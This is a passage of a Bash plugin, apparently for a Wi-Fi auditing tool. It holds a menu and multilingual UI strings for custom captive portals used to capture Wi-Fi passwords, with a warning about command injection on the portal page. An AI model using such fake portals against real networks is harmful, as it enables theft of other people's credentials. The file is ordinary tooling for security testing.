		language_strings "${language}" "custom_portals_text_8" "green"
		language_strings "${language}" "custom_portals_text_9" "red"
		print_simple_separator
		read -rp "> " full_password

		case $full_password in
			1)
				custom_portals_full_password='false'
				language_strings "${language}" "custom_portals_text_10" "green"
				break
			;;
			2)
				custom_portals_full_password='true'
				language_strings "${language}" "custom_portals_text_11" "red"
				break
			;;
			*)
				echo
				language_strings "${language}" "custom_portals_text_12" "red"
				language_strings "${language}" 115 "read"
			;;
		esac
	done

	language_strings "${language}" 115 "read"

}

#Custom function. Create text messages to be used in custom portals plugin
function initialize_custom_portals_language_strings() {

	debug_print

	declare -gA arr
	arr["ENGLISH","custom_portals_text_0"]="Select Your captive portal:"
	arr["SPANISH","custom_portals_text_0"]="\${pending_of_translation} Seleccione su portal cautivo:"
	arr["FRENCH","custom_portals_text_0"]="\${pending_of_translation} Sélectionnez votre portail captif:"
	arr["CATALAN","custom_portals_text_0"]="\${pending_of_translation} Seleccioneu el vostre portal en captivitat:"
	arr["PORTUGUESE","custom_portals_text_0"]="\${pending_of_translation} Selecione Seu portal cativo:"
	arr["RUSSIAN","custom_portals_text_0"]="\${pending_of_translation} Выберите свой портал:"
	arr["GREEK","custom_portals_text_0"]="\${pending_of_translation} Επιλέξτε την δεσμευμένη πύλη σας:"
	arr["ITALIAN","custom_portals_text_0"]="Seleziona il captive portal:"
	arr["POLISH","custom_portals_text_0"]="\${pending_of_translation} Wybierz swój portal dla niewoli:"
	arr["GERMAN","custom_portals_text_0"]="\${pending_of_translation} Wählen Sie Ihr Captive-Portal aus:"
	arr["TURKISH","custom_portals_text_0"]="\${pending_of_translation} Esir portalınızı seçin:"
	arr["ARABIC","custom_portals_text_0"]="\${pending_of_translation} حدد البوابة المقيدة الخاصة بك"

	arr["ENGLISH","custom_portals_text_1"]=" 1) Standard"
	arr["SPANISH","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Estándar"
	arr["FRENCH","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Standard"
	arr["CATALAN","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Estàndard"
	arr["PORTUGUESE","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Padrão"
	arr["RUSSIAN","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} стандарт"
	arr["GREEK","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Πρότυπο"
	arr["ITALIAN","custom_portals_text_1"]=" 1) Standard"
	arr["POLISH","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Standard"
	arr["GERMAN","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Standard"
	arr["TURKISH","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Standart"
	arr["ARABIC","custom_portals_text_1"]="\${pending_of_translation} 1) اساسي"

	arr["ENGLISH","custom_portals_text_2"]="No custom captive portals found!"
	arr["SPANISH","custom_portals_text_2"]="\${pending_of_translation} ¡No se encontraron portales cautivos personalizados!"
	arr["FRENCH","custom_portals_text_2"]="\${pending_of_translation} Aucun portail captif personnalisé trouvé!"
	arr["CATALAN","custom_portals_text_2"]="\${pending_of_translation} No s’han trobat portals en captivitat personalitzats!"
	arr["PORTUGUESE","custom_portals_text_2"]="\${pending_of_translation} Não foram encontrados portais cativos personalizados!"
	arr["RUSSIAN","custom_portals_text_2"]="\${pending_of_translation} Не найдено ни одного пользовательского портала!"
	arr["GREEK","custom_portals_text_2"]="\${pending_of_translation} Δεν βρέθηκαν προσαρμοσμένες πύλες δέσμιας!"
	arr["ITALIAN","custom_portals_text_2"]="Nessun captive portal personalizzato trovato!"
	arr["POLISH","custom_portals_text_2"]="\${pending_of_translation} Nie znaleziono niestandardowych portali typu captive!"
	arr["GERMAN","custom_portals_text_2"]="\${pending_of_translation} Keine benutzerdefinierten Captive-Portale gefunden!"
	arr["TURKISH","custom_portals_text_2"]="\${pending_of_translation} Özel sabit portal bulunamadı!"
	arr["ARABIC","custom_portals_text_2"]="\${pending_of_translation} لم يتم العثور على بوابات مقيدة مخصصة"

	arr["ENGLISH","custom_portals_text_3"]="Please put Your custom captive portal files in:"
	arr["SPANISH","custom_portals_text_3"]="\${pending_of_translation} Coloque sus archivos de portal cautivo personalizados en:"
	arr["FRENCH","custom_portals_text_3"]="\${pending_of_translation} Veuillez placer vos fichiers de portail captif personnalisés dans:"
	arr["CATALAN","custom_portals_text_3"]="\${pending_of_translation} Si us plau, introduïu els fitxers de portal personalitzat en captivitat a:"
	arr["PORTUGUESE","custom_portals_text_3"]="\${pending_of_translation} Coloque seus arquivos de portal em cativeiro personalizados em:"
	arr["RUSSIAN","custom_portals_text_3"]="\${pending_of_translation} Пожалуйста, поместите Ваши пользовательские файлы портала в:"
	arr["GREEK","custom_portals_text_3"]="\${pending_of_translation} Τοποθετήστε τα προσαρμοσμένα αρχεία της πύλης δεσμευμένων σε:"
	arr["ITALIAN","custom_portals_text_3"]="Inserisci i file dei captive portal personalizzati in:"
	arr["POLISH","custom_portals_text_3"]="\${pending_of_translation} Proszę umieścić własne niestandardowe pliki portalu w:"
	arr["GERMAN","custom_portals_text_3"]="\${pending_of_translation} Bitte legen Sie Ihre benutzerdefinierten Captive-Portal-Dateien in:"
	arr["TURKISH","custom_portals_text_3"]="\${pending_of_translation} Lütfen özel esir portal dosyalarınızı buraya yerleştirin:"
	arr["ARABIC","custom_portals_text_3"]="\${pending_of_translation} يرجى وضع ملفات المدخل المقيدة المخصصة الخاصة بك في"

	arr["ENGLISH","custom_portals_text_4"]="Invalid captive portal was chosen!"
	arr["SPANISH","custom_portals_text_4"]="\${pending_of_translation} ¡Se eligió el portal cautivo no válido!"
	arr["FRENCH","custom_portals_text_4"]="\${pending_of_translation} Un portail captif non valide a été choisi!"
	arr["CATALAN","custom_portals_text_4"]="\${pending_of_translation} El portal captiu no és vàlid!"
	arr["PORTUGUESE","custom_portals_text_4"]="\${pending_of_translation} Portal cativo inválido foi escolhido!"
	arr["RUSSIAN","custom_portals_text_4"]="\${pending_of_translation} Выбран неверный портал!"
	arr["GREEK","custom_portals_text_4"]="\${pending_of_translation} Επιλέχθηκε μη έγκυρη πύλη αιχμαλωσίας!"
	arr["ITALIAN","custom_portals_text_4"]="Scelta non valida!"
	arr["POLISH","custom_portals_text_4"]="\${pending_of_translation} Wybrano nieprawidłowy portal dla niewoli!"
	arr["GERMAN","custom_portals_text_4"]="\${pending_of_translation} Es wurde ein ungültiges Captive-Portal ausgewählt!"
	arr["TURKISH","custom_portals_text_4"]="\${pending_of_translation} Geçersiz esir portal seçildi!"
	arr["ARABIC","custom_portals_text_4"]="\${pending_of_translation} تم اختيار بوابة مقيدة غير صالحة"

	arr["ENGLISH","custom_portals_text_5"]="Captive portal choosen:"
	arr["SPANISH","custom_portals_text_5"]="\${pending_of_translation} Portal cautivo elegido:"
	arr["FRENCH","custom_portals_text_5"]="\${pending_of_translation} Portail captif choisi:"
	arr["CATALAN","custom_portals_text_5"]="\${pending_of_translation} Portal captiu escollit:"
	arr["PORTUGUESE","custom_portals_text_5"]="\${pending_of_translation} Portal cativo escolhido:"
	arr["RUSSIAN","custom_portals_text_5"]="\${pending_of_translation} Пленный портал выбран:"
	arr["GREEK","custom_portals_text_5"]="\${pending_of_translation} Επιλεγμένη πύλη αιχμαλωσίας:"
	arr["ITALIAN","custom_portals_text_5"]="Captive portal selezionato:"
	arr["POLISH","custom_portals_text_5"]="\${pending_of_translation} Wybrany portal dla niewoli:"
	arr["GERMAN","custom_portals_text_5"]="\${pending_of_translation} Captive Portal ausgewählt:"
	arr["TURKISH","custom_portals_text_5"]="\${pending_of_translation} Seçilen esir portalı:"
	arr["ARABIC","custom_portals_text_5"]="\${pending_of_translation} تم اختيار بوابة مقيدة"

	arr["ENGLISH","custom_portals_text_6"]="Do you want to enable the detection of passwords containing *&/?<> characters?"
	arr["SPANISH","custom_portals_text_6"]="\${pending_of_translation} ¿Desea habilitar la detección de contraseñas que contengan caracteres *&/?<> ?"
	arr["FRENCH","custom_portals_text_6"]="\${pending_of_translation} Voulez-vous activer la détection des mots de passe contenant des caractères *&/?<> ?"
	arr["CATALAN","custom_portals_text_6"]="\${pending_of_translation} Voleu habilitar la detecció de contrasenyes que contenen caràcters *&/?<> ?"
	arr["PORTUGUESE","custom_portals_text_6"]="\${pending_of_translation} Deseja habilitar a detecção de senhas contendo caracteres *&/?<> ?"
	arr["RUSSIAN","custom_portals_text_6"]="\${pending_of_translation} Вы хотите включить обнаружение паролей, содержащих символы *&/?<> ?"
	arr["GREEK","custom_portals_text_6"]="\${pending_of_translation} Θέλετε να ενεργοποιήσετε τον εντοπισμό κωδικών πρόσβασης που περιέχουν χαρακτήρες *&/?<>"
	arr["ITALIAN","custom_portals_text_6"]="Vuoi abilitare il rilevamento delle password contenenti i caratteri *&/?<> ?"
	arr["POLISH","custom_portals_text_6"]="\${pending_of_translation} Czy chcesz włączyć wykrywanie haseł zawierających znaki *&/?<> ?"
	arr["GERMAN","custom_portals_text_6"]="\${pending_of_translation} Möchten Sie die Erkennung von Passwörtern aktivieren, die *&/?<> Zeichen enthalten?"
	arr["TURKISH","custom_portals_text_6"]="\${pending_of_translation} *&/?<> karakterlerini içeren parolaların algılanmasını etkinleştirmek istiyor musunuz?"
	arr["ARABIC","custom_portals_text_6"]="\${pending_of_translation} هل تريد تمكين اكتشاف كلمات المرور التي تحتوي على أحرف * & /؟ <>؟"

	arr["ENGLISH","custom_portals_text_7"]="WARNING: Enabling the detection of passwords containing *&/?<> characters is very dangerous as injections can be done on captive portal page and the hacker could be hacked by some kind of command injection on the captive portal page. ACTIVATE AT YOUR OWN RISK!"
	arr["SPANISH","custom_portals_text_7"]="\${pending_of_translation} ADVERTENCIA: Habilitar la detección de contraseñas que contienen caracteres *&/?<> es muy peligroso ya que se pueden realizar inyecciones en la página del portal cautivo y el hacker podría ser pirateado mediante algún tipo de inyección de comando en la página del portal cautivo. ¡ACTÍVALO BAJO TU PROPIO RIESGO!"
	arr["FRENCH","custom_portals_text_7"]="\${pending_of_translation} AVERTISSEMENT: Activer la détection des mots de passe contenant des caractères *&/?<> est très dangereux car des injections peuvent être effectuées sur la page du portail captif et le pirate pourrait être piraté par une sorte d'injection de commande sur la page du portail captif. ACTIVEZ À VOS PROPRES RISQUES!"
	arr["CATALAN","custom_portals_text_7"]="\${pending_of_translation} ADVERTÈNCIA: Habilitar la detecció de contrasenyes que contenen caràcters *&/?<> és molt perillós, ja que les injeccions es poden fer a la pàgina del portal captiu i el pirata informàtic podria ser piratejat mitjançant algun tipus d'injecció d'ordres a la pàgina del portal captiu. ACTIVA AL TEU PROPI RISC!"
	arr["PORTUGUESE","custom_portals_text_7"]="\${pending_of_translation} AVISO: Habilitar a detecção de senhas contendo caracteres *&/?<> é muito perigoso, pois as injeções podem ser feitas na página do portal cativo e o hacker pode ser invadido por algum tipo de injeção de comando na página do portal cativo. ATIVE POR SUA CONTA E RISCO!"
	arr["RUSSIAN","custom_portals_text_7"]="\${pending_of_translation} ПРЕДУПРЕЖДЕНИЕ: Включение обнаружения паролей, содержащих символы *&/?<> , очень опасно, так как инъекции могут быть выполнены на странице авторизованного портала, и хакер может быть взломан путем внедрения какой-либо команды на странице авторизованного портала. АКТИВИРУЙТЕ НА СВОЙ РИСК!"
	arr["GREEK","custom_portals_text_7"]="\${pending_of_translation} ΠΡΟΕΙΔΟΠΟΙΗΣΗ: Η ενεργοποίηση της ανίχνευσης κωδικών πρόσβασης που περιέχουν χαρακτήρες *&/?<> είναι πολύ επικίνδυνη, καθώς μπορούν να γίνουν εγχύσεις στη σελίδα της πύλης και ο χάκερ μπορεί να παραβιαστεί με κάποιου είδους ένεση εντολών στη σελίδα της πύλης αποκλειστικής χρήσης. ΕΝΕΡΓΟΠΟΙΗΣΤΕ ΜΕ ΔΙΚΗ ΣΑΣ ΕΥΘΥΝΗ!"
	arr["ITALIAN","custom_portals_text_7"]="ATTENZIONE: abilitare il rilevamento di password contenenti i caratteri *&/?<> è molto pericoloso in quanto delle injection possono essere eseguite sulla pagina del captive portal e l'hacker potrebbe essere violato da una sorta di command injection nella pagina del captive portal. ATTIVALA A TUO RISCHIO!"
	arr["POLISH","custom_portals_text_7"]="\${pending_of_translation} OSTRZEŻENIE: Włączenie wykrywania haseł zawierających znaki *&/?<> jest bardzo niebezpieczne, ponieważ wstrzyknięcia można wykonać na stronie portalu przechwytującego, a haker może zostać zhakowany przez wstrzyknięcie polecenia na stronie portalu przechwytującego. AKTYWUJ NA WŁASNE RYZYKO!"
	arr["GERMAN","custom_portals_text_7"]="\${pending_of_translation} WARNUNG: Das Aktivieren der Erkennung von Passwörtern mit *&/?<> Zeichen ist sehr gefährlich, da Injektionen auf der Seite des Captive-Portals vorgenommen werden können und der Hacker durch eine Art Befehlsinjektion auf der Seite des Captive-Portals gehackt werden könnte. AKTIVIERUNG AUF EIGENES RISIKO!"
	arr["TURKISH","custom_portals_text_7"]="\${pending_of_translation} UYARI: *&/?<> karakterlerini içeren şifrelerin tespitini etkinleştirmek çok tehlikelidir çünkü girişler sabit portal sayfasında yapılabilir ve bilgisayar korsanı, sabit portal sayfasında bir tür komut enjeksiyonu ile hacklenebilir. RİSK SİZE AİT ETKİNLEŞTİRİN!"
	arr["ARABIC","custom_portals_text_7"]="\${pending_of_translation} تحذير: يعد تمكين اكتشاف كلمات المرور التي تحتوي على أحرف * & /؟ نشط على مسؤوليتك الخاصة!"

	arr["ENGLISH","custom_portals_text_8"]=" 1) No"
	arr["SPANISH","custom_portals_text_8"]="\${pending_of_translation} 1) No"
	arr["FRENCH","custom_portals_text_8"]="\${pending_of_translation} 1) Non"
	arr["CATALAN","custom_portals_text_8"]="\${pending_of_translation} 1) No"
	arr["PORTUGUESE","custom_portals_text_8"]="\${pending_of_translation} 1) Não"
	arr["RUSSIAN","custom_portals_text_8"]="\${pending_of_translation} 1) Нет"
	arr["GREEK","custom_portals_text_8"]="\${pending_of_translation} 1) Οχι"
	arr["ITALIAN","custom_portals_text_8"]=" 1) No"
	arr["POLISH","custom_portals_text_8"]="\${pending_of_translation} 1) Nie"
	arr["GERMAN","custom_portals_text_8"]="\${pending_of_translation} 1) Nein"
	arr["TURKISH","custom_portals_text_8"]="\${pending_of_translation} 1) Numara"
	arr["ARABIC","custom_portals_text_8"]="\${pending_of_translation} 1) رقم"

	arr["ENGLISH","custom_portals_text_9"]=" 2) Yes"
	arr["SPANISH","custom_portals_text_9"]="\${pending_of_translation} 2) Sí"
	arr["FRENCH","custom_portals_text_9"]="\${pending_of_translation} 2) Oui"
	arr["CATALAN","custom_portals_text_9"]="\${pending_of_translation} 2) Sí"
	arr["PORTUGUESE","custom_portals_text_9"]="\${pending_of_translation} 2) Sim"
	arr["RUSSIAN","custom_portals_text_9"]="\${pending_of_translation} 2) да"
	arr["GREEK","custom_portals_text_9"]="\${pending_of_translation} 2) Ναί"
	arr["ITALIAN","custom_portals_text_9"]=" 2) Si"
	arr["POLISH","custom_portals_text_9"]="\${pending_of_translation} 2) Tak"
	arr["GERMAN","custom_portals_text_9"]="\${pending_of_translation} 2) Ja"
	arr["TURKISH","custom_portals_text_9"]="\${pending_of_translation} 2) Evet"
	arr["ARABIC","custom_portals_text_9"]="\${pending_of_translation} 2) نعم"

	arr["ENGLISH","custom_portals_text_10"]="Detection of passwords containing *&/?<> characters is DISABLED"
	arr["SPANISH","custom_portals_text_10"]="\${pending_of_translation} La detección de contraseñas que contienen *&/?<> caracteres está DESACTIVADA"
	arr["FRENCH","custom_portals_text_10"]="\${pending_of_translation} La détection des mots de passe contenant les caractères *&/?<> est DÉSACTIVÉE"
	arr["CATALAN","custom_portals_text_10"]="\${pending_of_translation} La detecció de contrasenyes que contenen caràcters *&/?<> està DESACTIVADA"
	arr["PORTUGUESE","custom_portals_text_10"]="\${pending_of_translation} A detecção de senhas contendo caracteres *&/?<> está DESATIVADA"
	arr["RUSSIAN","custom_portals_text_10"]="\${pending_of_translation} ОТКЛЮЧЕНО обнаружение паролей, содержащих символы *&/?<>"
	arr["GREEK","custom_portals_text_10"]="\${pending_of_translation} Ο εντοπισμός κωδικών πρόσβασης που περιέχουν χαρακτήρες *&/?<> είναι ΑΠΕΝΕΡΓΟΠΟΙΗΜΕΝΟΣ"
	arr["ITALIAN","custom_portals_text_10"]="Il rilevamento delle password contenenti i caratteri *&/?<> è DISATTIVATO"
	arr["POLISH","custom_portals_text_10"]="\${pending_of_translation} Wykrywanie haseł zawierających znaki *&/?<> jest WYŁĄCZONE"
	arr["GERMAN","custom_portals_text_10"]="\${pending_of_translation} Die Erkennung von Passwörtern mit *&/?<> Zeichen ist DEAKTIVIERT"
	arr["TURKISH","custom_portals_text_10"]="\${pending_of_translation} *&/?<> karakterlerini içeren şifrelerin algılanması DEVRE DIŞI"
	arr["ARABIC","custom_portals_text_10"]="\${pending_of_translation} تم تعطيل الكشف عن كلمات المرور التي تحتوي على * & /؟"

	arr["ENGLISH","custom_portals_text_11"]="WARNING: detection of passwords containing *&/?<> characters is ENABLED!"
	arr["SPANISH","custom_portals_text_11"]="\${pending_of_translation} ADVERTENCIA: ¡la detección de contraseñas que contienen caracteres *&/?<> Está HABILITADA!"
	arr["FRENCH","custom_portals_text_11"]="\${pending_of_translation} ATTENTION: la détection des mots de passe contenant des caractères *&/?<> Est ACTIVÉE!"
	arr["CATALAN","custom_portals_text_11"]="\${pending_of_translation} ADVERTIMENT: la detecció de contrasenyes que contenen caràcters *&/?<> Està habilitada!"
	arr["PORTUGUESE","custom_portals_text_11"]="\${pending_of_translation} AVISO: a detecção de senhas que contêm caracteres *&/?<> Está ATIVADA!"
	arr["RUSSIAN","custom_portals_text_11"]="\${pending_of_translation} ВНИМАНИЕ: обнаружение паролей, содержащих символы *&/?<> ВКЛЮЧЕНО!"
	arr["GREEK","custom_portals_text_11"]="\${pending_of_translation} ΠΡΟΕΙΔΟΠΟΙΗΣΗ: Η ανίχνευση κωδικών πρόσβασης που περιέχουν χαρακτήρες *&/?<> ΕΝΕΡΓΟΠΟΙΗΘΕΙ!"
	arr["ITALIAN","custom_portals_text_11"]="ATTENZIONE: il rilevamento di password contenenti caratteri *&/?<> È ABILITATO!"
	arr["POLISH","custom_portals_text_11"]="\${pending_of_translation} OSTRZEŻENIE: wykrywanie haseł zawierających znaki *&/?<> Jest WŁĄCZONE!"
	arr["GERMAN","custom_portals_text_11"]="\${pending_of_translation} WARNUNG: Die Erkennung von Passwörtern mit *&/?<> Zeichen ist AKTIVIERT!"
	arr["TURKISH","custom_portals_text_11"]="\${pending_of_translation} UYARI: *&/?<> Karakterleri içeren şifrelerin tespiti ETKİN!"
	arr["ARABIC","custom_portals_text_11"]="\${pending_of_translation} تحذير: تم تمكين اكتشاف كلمات المرور التي تحتوي على * & /؟ <> أحرف"

	arr["ENGLISH","custom_portals_text_12"]="Invalid choice!"
	arr["SPANISH","custom_portals_text_12"]="\${pending_of_translation} ¡Elección inválida!"
	arr["FRENCH","custom_portals_text_12"]="\${pending_of_translation} Choix invalide!"
	arr["CATALAN","custom_portals_text_12"]="\${pending_of_translation} Elecció no vàlida!"
	arr["PORTUGUESE","custom_portals_text_12"]="\${pending_of_translation} Escolha inválida!"
	arr["RUSSIAN","custom_portals_text_12"]="\${pending_of_translation} Неверный выбор!"
	arr["GREEK","custom_portals_text_12"]="\${pending_of_translation} Μη έγκυρη επιλογή!"
	arr["ITALIAN","custom_portals_text_12"]="Scelta non valida!"
	arr["POLISH","custom_portals_text_12"]="\${pending_of_translation} Nieprawidłowy wybór!"
	arr["GERMAN","custom_portals_text_12"]="\${pending_of_translation} Ungültige Wahl!"
	arr["TURKISH","custom_portals_text_12"]="\${pending_of_translation} Geçersiz seçim!"
	arr["ARABIC","custom_portals_text_12"]="\${pending_of_translation} اختيار غير صحيح"
}

initialize_custom_portals_language_strings
